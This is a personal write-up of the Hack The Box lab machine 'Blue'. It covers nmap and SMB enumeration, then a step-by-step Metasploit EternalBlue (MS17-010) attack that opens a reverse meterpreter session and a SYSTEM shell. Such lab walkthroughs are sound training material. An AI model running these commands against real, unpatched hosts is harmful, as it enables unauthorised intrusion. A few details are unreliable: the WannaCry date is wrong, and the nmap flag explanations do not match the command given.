---
title: Blue Writeup/Walk through
date: 2025-03-12
tags:
  - writeup
  - walkthrough
  - hackthebox
---
Today a friend and I started our Hack the Box labs journey by completing the retired machine Blue. While it was really easy, we both learned some new things in regards to the *Eternal Blue* exploit. Below is our personal goals, goals of the machine, and walk through showing how we obtained the flags.
# Personal Goals
- Get flags in under 30 minuets
	- Accomplished
# Goals
- submit user flag
- submit root flag
# Blue Machine Write Up
## Summary of Eternal Blue
Blue is a machine on a popular cybersecurity training website called *Hack The Box*, also known as HTB. This machine is meant to teach the user how to exploit the common vulnerability called *Eternal Blue*, also known as MS17-010, which effected Microsoft Windows from Vista until Windows Server 2016. This exploit was also used in the *WannaCry* ransomware attack on June 27, 2017. There is a patch now and more recent systems are no longer effected from this vulnerability since Microsoft disables the protocol by default. However if and older machine is on the network and it has not received the patch for *Eternal Blue* it is still vulnerable.

## Connecting to the Machine
This will differ for everyone but since I try to keep my workspace as neat as possible and attempt to limit the number of terminals I have open at a given time I use `tmux` to spawn terminal's inside of terminals. Tmux is a terminal multiplexer that allows you to basically have a terminal inside of a terminal as I described above. To install tmux you will need to run the following command
- `sudo apt install tmux -y`
After installing tmux, to spawn a new terminal you will want to run a very simple command below
- `tmux`
Thats it, you are now in your terminal inside of a terminal. In this terminal you can do what ever you want. I use it to spawn my openvpn software in this case using the command below
- `sudo openvpn /path/to/.opvpn`
After running the command I press `CNTRL + B` and then the `D` key to disconnect from the tmux session. To get back to the session your vpn was in just use the command below with the session number you just detached from
- `tmux attach -t (session number)`
Now that we have that set up, we can move into scanning and doing some enumeration on this machine.

## Enumeration
We started off with basic enumeration. But first lets make sure our host machine is online by pinging it.
- `ping 10.10.10.40`
- ![Image Description](/images/Screenshot_2025-03-12_16-40-09.png)
### Nmap Scan
Now that we know the machine is online we can scan the machine using the below command.
- `nmap -Pn -sV -sS 10.10.10.40`
	- **-Pn** turns off host discovery, we do not need this as we already know our host is online
	- **-sVC** is for our service version scan, this will inform us of all the services versions when the scan is complete it will also provide the hostname of the system and the OS
	- **-sS** is for a TCP SYN scan
	- **-p 1-10000** only will scan ports 1-10000, in guided mode the task is only asking for ports that are not 5 digits long.
	- 
- !![Image Description](/images/Pasted%20image%2020250312164710.png)
Now that we have the Nmap scan complete lets look over our ports and see what is interesting to us.
- Port 135 MSRPC
	- Microsoft Remote Procedure Call. 
	- Allows for programs on different computers to communicate and execute functions or procedures with eachother
- Port 139 NetBIOS
	- Used for SMB communication
- Port 445
	- Used for SMB
The two ports that stood out the most to me are ports 139 and 445 since they are both used for SMB. Lets enumerate the SMB shares on this machine.

### SMB Enumeration
To start this I used `smbclient` to connect and list the shares on the machine. Below is the command I used to do that since you will need to say how many shares there are in the guided mode of this machine.
- `smbclient -L (machine IP)`
	- **-L** lists all the shares in SMB
- ![Image Description](/images/Pasted%20image%2020250312165347.png)
Now that we have that out of the way lets start the exploitation process of this machine

## Exploitation

### Checking to see if the machine is vulnerable
First we should see if the machine is even vulnerable to *Eternal Blue*.
- **Side note**: Even though we already know the machine is vulnerable to it, as a penetration tester you should **ALWAYS** scan the machine to see if it is vulnerable to anything like this before just going to exploit. This will save you time later on.
To do this we will use *metasploit* you can spawn your metasploit terminal by using the command below
- `msfconsole`
- ![Image Description](/images/Pasted%20image%2020250312165637.png)
After we have spawned metasploit we will search for our MS17-010 scanner by using the following command
- `search auxiliary eternal blue`
- ![Image Description](/images/Pasted%20image%2020250312165834.png)
The module we will select here is 5, to do so use the following command
- `use 5`
- ![Image Description](/images/Pasted%20image%2020250312165920.png)
After that we will want to see the options this gives us, to do so use the show options command below
- `show options`
- ![Image Description](/images/Pasted%20image%2020250312170020.png)
Now that we have that, lets set RHOSTS to our machines IP address so we can scan it using the following command.
- `set RHOSTS (machine IP)`
- ![Image Description](/images/Pasted%20image%2020250312170135.png)
Now that that is done, lets run our scanner
- `run`
- ![Image Description](/images/Pasted%20image%2020250312170223.png)
It looks like the machine is vulnerable to Eternal Blue! Now its time to actually exploit the machine.

### Running the exploit
The first thing we will need to do is find the module we want to use in metasploit. To do this we will use the below command.
- `search eternal blue`
- ![Image Description](/images/Pasted%20image%2020250312170459.png)
We will want to use the module that is called *windows/smb/ms17_010_eternalblue* to do so on my end I will run the below command.
- `use 1`
- ![Image Description](/images/Pasted%20image%2020250312170610.png)
Again we will want to show our options to see what needs to be configured.
- `show options`
- ![Image Description](/images/Pasted%20image%2020250312170702.png)
Time to configure the options, the only things that need to be configured are the *RHOSTS* and the *LHOST*. The *LHOST* is the VPN IP of **YOUR** attack machine. Follow the below commands to set up your exploit module.
- `set RHOSTS (machine IP)`
- Spawn a new terminal and run the below command
	- `ifconfig tun0`
		- Get the inet IP address
	- 
- `set LHOST (tun0 IP address)`
- Yours should look similar to the below but with your LHOST set
- ![Image Description](/images/Pasted%20image%2020250312171201.png)
Now that everything is configured, lets run our exploit
- `run`
- ![Image Description](/images/Pasted%20image%2020250312171358.png)
And now we have a meterpreter session on the victims computer! Lets spawn a shell.
- `shell`
- ![Image Description](/images/Pasted%20image%2020250312171521.png)
Now a quick whoami to see what user we are and to see the privileges we have.
- `whoami`
- ![Image Description](/images/Pasted%20image%2020250312171608.png)
We were given admin credentials, we have full control over our system. Now time to get those flags!
- User flag is stored at
	- **C:\Users\haris\Desktop**
- Root flag is stored at
	- **C:\Users\Administrator\Desktop**
Submit those flags and you have then PWND this machine!

# Summary of the Machine
While this machine is easy, it shows newcomers to cybersecurity the dangers of misconfigurations and how vulnerable an unpatched machine is. I hope this write up helped you and I hope you learned something from this.

